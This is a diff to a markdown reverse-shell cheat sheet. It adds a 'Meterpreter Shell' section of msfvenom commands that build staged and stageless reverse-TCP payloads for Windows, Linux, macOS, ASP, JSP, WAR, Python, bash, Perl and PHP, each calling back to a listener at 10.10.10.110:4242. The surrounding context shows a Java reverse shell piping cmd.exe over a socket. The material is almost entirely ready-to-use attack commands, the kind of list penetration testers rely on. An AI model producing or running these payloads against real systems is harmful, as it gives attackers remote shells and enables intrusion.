@@ -21,6 +21,12 @@
     * [Lua](#lua)
     * [NodeJS](#nodejs)
     * [Groovy](#groovy)
+* [Meterpreter Shell](#meterpreter-shell)
+    * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
+    * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
+    * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
+    * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
+    * [Other platforms](#other-platforms)
 * [Spawn TTY Shell](#spawn-tty-shell)
 * [References](#references)
 
@@ -229,6 +235,47 @@ String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+## Meterpreter Shell
+
+### Windows Staged reverse TCP
+
+```powershell
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe
+```
+
+### Windows Stageless reverse TCP
+
+```powershell
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe
+```
+
+### Linux Staged reverse TCP
+
+```powershell
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f elf >reverse.elf
+```
+
+### Linux Stageless reverse TCP
+
+```powershell
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f elf >reverse.elf
+```
+
+### Other platforms
+
+```powershell
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
+$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
 
 ## Spawn TTY Shell
